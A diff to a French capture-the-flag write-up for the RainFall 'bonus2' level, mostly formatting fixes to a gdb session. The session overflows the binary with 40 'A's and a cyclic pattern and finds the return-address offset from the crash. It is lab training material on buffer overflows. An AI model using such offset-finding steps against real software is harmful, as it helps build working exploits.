@@ -79,7 +79,7 @@ and "show warranty" for details.
 This GDB was configured as "i686-linux-gnu".
 For bug reporting instructions, please see:
 <http://bugs.launchpad.net/gdb-linaro/>...
-Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.                                           (gdb) break *main+125
+Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
 (gdb) break *main+125
 Breakpoint 1 at 0x80485a6
 (gdb) run asdf asdf
@@ -103,8 +103,7 @@ Breakpoint 1, 0x080485a6 in main ()                                             
 Il nous faut aussi l'offset a partir duquel ecrire notre nouvelle adresse:
 
 ```bash
-bonus2@RainFall:~$ gdb ./bonus2
-(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A                                                                                                                  Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
 Program received signal SIGSEGV, Segmentation fault.
 0x38614137 in ?? () # Offset = 23
